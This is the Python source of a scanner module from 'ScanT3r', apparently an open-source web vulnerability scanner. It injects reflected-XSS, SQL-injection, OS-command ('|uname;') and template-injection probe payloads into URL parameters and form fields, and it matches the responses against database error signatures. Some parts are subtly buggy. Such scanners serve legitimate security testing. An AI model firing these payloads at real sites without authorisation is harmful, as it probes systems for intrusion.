#!/usr/bin/env python
# ScanT3r Web application Security Scanner - By : Khaled Nassar @knassar702
__author__ = 'Khaled Nassar'
__version__ = '0.1'
__github__ = 'https://github.com/knassar702/scant3r'
__email__ = 'knassar702@gmail.com'
__blog__ = 'https://knassar7o2.blogspot.com'

import requests,time,sys,os,re,random
from .encoder import urlencoder
from .colors import *
from .reporter import make_report

errors = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'unkown' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found','internal server':'The page cannot be displayed because an internal server error has occurred.','Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
def uagent():
	agents=[
	'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
	'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'
	] # Add Your User-Agents Here :)
	return random.choice(agents).encode('utf-8') # Add random User-agent in request

class paramscanner: # Scanner Module
	def __init__(slef):
		pass
	def xss(slef,url,co,tim,deco,vert,redir):
		deco = deco - 1
		if '*' in url:
			print (end)
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>']
			for payload in payloads:
				payload2=urlencoder(payload)
				for i in range(deco):
					payload2=urlencoder(payload2)
				r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				if payload.encode('utf-8') in r.content:
					j=url.replace('*',payload2)
					print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Exploit : {j}""")
					break
		elif '*' not in url:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			for params in url.split("?")[1].split("&"):
				for payload in payloads:
					payload2=urlencoder(payload)
					for i in range(deco):
						payload2=urlencoder(payload2) # encode the payload
					r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					if payload.encode('utf-8') in r.content:
						j=url.replace(params, params + str(payload2).strip())
						print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Param : {params}
{info}{bold} Exploit : {j}""")
						break
	def xss_post(self,url,co,tim,dat,vert,redir):
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src='x' onerror='alert(1)'>"]
			for payload in payloads:
					for i,c in dat.items():
						dat[i] = c.replace('*',payload)
					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
					if payload.encode('utf-8') in r.content:
						print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
						for i,c in dat.items():
							dat[i] = c.replace(payload,'*')
						break
					else:
						for i,c in dat.items():
							dat[i] = c.replace(payload,'*')
						continue
		else:
			payloads=['<img src=x onerror=alert(1)>','">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c + payload
				r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
				if payload.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}{bold}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					for i,c in dat.items():
						dat[i] = c.replace(payload,'')
					break
				else:
					for i,c in dat.items():
						dat[i] = c.replace(payload,'')
					continue
	def sqli_post(self,url,co,tim,dat,vert,redir):
		ok = False
		te = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
		for c,d in errors.items():
			fir = re.findall(d.encode('utf-8'),te.content)
			if fir != []:
				break
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payload="""'"\\//"""
			for i,d in dat.items():
				dat[i] = d.replace('*',payload)
			r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					print(f"""
{bold}{good}{bold} Bug Found : SQL injection
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}{bold}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					break
			for i,d in dat.items():
				dat[i] = d.replace(payload,'*')
		else:
			payload="""'"\\//"""
			for i,d in dat.items():
				dat[i] = d + payload
			r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					print(f"""
{bold}{good}{bold} Bug Found : SQL injection
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					break
			for i,d in dat.items():
				dat[i] = d.replace(payload,'')
	def osinj_post(self,url,co,tim,dat,vert,redir):
		te = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
		fir = re.findall('Linux'.encode('utf-8'),te.content)
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=["|uname;"]
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c.replace('*',payload)
				r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					print(f"""
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					for i,d in dat.items():
						dat[i] = d.replace(payload,'*')
					break
				else:
					for i,d in dat.items():
						dat[i] = d.replace(payload,'*')
					continue
		else:
			payloads=["|uname;"]
			for payload in payloads:
				for i,d in dat.items():
					dat[i] = d + payload
				r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					print(f"""
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}""")
					for i,d in dat.items():
						dat[i] = d.replace(payload,'')
					break
				else:
					for i,d in dat.items():
						dat[i] = d.replace(payload,'')
					continue
	def ssti_post(self,url,co,tim,dat,vert,redir):
		ok = False
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c.replace('*',payload)
				r = requests.post(url,data=dat,headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : Template injection (SSTI)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {url}""")
					for i,d in dat.items():
						dat[i] = i.replace(payload,'*')
					break
				else:
					for i,d in dat.items():
						dat[i] = i.replace(payload,'*')
					continue
		else:
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c + payload
				if tim:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent()})
				else:
					if co:
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
					else:
						r = requests.post(url,data=dat,verify=vert,allow_redirects=redir,headers={'User-agent':uagent()})
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					print(f"""
{bold}{good}{bold} Bug Found : Template injection (SSTI)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {url}""")
					for i,d in dat.items():
						dat[i] = i.replace(payload,'')
					break
				else:
					for i,d in dat.items():
						dat[i] = i.replace(payload,'')
					continue
	def sqli(self,url,co,tim,deco,vert,redir):
		deco = deco - 1
		payload="""'"\\//"""
		te = requests.get(url,cookies=co,headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
		for v,c in errors.items():
			fir = re.findall(c.encode('utf-8'),te.content)
			if fir != []:
				break
		if '*' in url:
			payload="""'"\\//"""
			payload=urlencoder(payload)
			for i in range(deco):
				payload=urlencoder(payload)
			r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					j=url.replace('*',payload.strip())
					print(f"""

{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload : "
{info}{bold} Exploit : {j}
{info}{bold} SQL Error : {i}
                                """)
					break
		elif '*' not in url:
			for params in url.split("?")[1].split("&"):
				payload="""'"\\//"""
				payload=urlencoder(payload)
				for h in range(deco):
					payload=urlencoder(payload)
				for d,i in errors.items():
					r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					ch = re.findall(i.encode('utf-8'),r.content)
					if len(ch) > len(fir):
						j=url.replace(params, params + str(payload).strip())
						print(f"""
{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload   : {payload}
{bold}{info}{bold} Param     : {params}
{bold}{info}{bold} SQL Error : {i}
{bold}{info}{bold} Exploit   : {j}
				""")
						break
	def osinj(self,url,co,tim,deco,vert,redir):
		deco = deco - 1
		te = requests.get(url,cookies=co,headers={'User-agent':uagent()},verify=vert,allow_redirects=redir,timeout=tim)
		fir = re.findall('Linux'.encode('utf-8'),te.content)
		if '*' in url:
			payloads=["|uname;"]
			for payload in payloads:
				for h in range(deco):
					payload=urlencoder(payload)
				r=requests.get(url.replace('*',str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					j=url.replace('*',payload.strip())
					print (f"""

{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}
				""")
					break
		for params in url.split("?")[1].split("&"):
			payloads=["|uname;"]
			for payload in payloads:
				for h in range(deco):
					payload=urlencoder(payload)
				r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					j=url.replace(params, params + str(payload).strip())
					print (f"""
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
					break
	def ssti(self,url,co,tim,deco,vert,redir):
		if '*' in url:
			payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}']
			for payload in payloads:
				for h in range(deco):
					payload=urlencoder(payload)
				r=requests.get(url.replace('*',str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
				if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
					j=url.replace('*',str(payload).strip())
					print (f"""
{bold}{good}{bold} Bug Found : Template Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}""")
					break
		elif '*' not in url:
			for params in url.split("?")[1].split("&"):
				payloads=['{{15279729727952579217591275217927272761*151723272727272725159151516565156}}','<%= 15279729727952579217591275217927272761 * 151723272727272725159151516565156 %>','${15279729727952579217591275217927272761*151723272727272725159151516565156}}']
				for payload in payloads:
					for h in range(deco):
						payload=urlencoder(payload)
					r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent()},cookies=co,verify=vert,allow_redirects=redir,timeout=tim)
					if '2318290600713165858675521351981765038022843684314114299721561440515716'.encode('utf-8') in r.content:
						j=url.replace(params, params + str(payload).strip())
						print (f"""
{bold}{good}{bold} Bug Found : Template Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}
				""")
						break
class webscraper: # web scraper modules .. coming soon ^_^
	def __init__(self):
		pass
	def geturls(self,url):
		pass # This module Bulid To Dump All urls in page EX : (<a href='target.com/login.php')
	def getforms(self,url):
		pass # This module Build To Dump all forms and parameters in The Page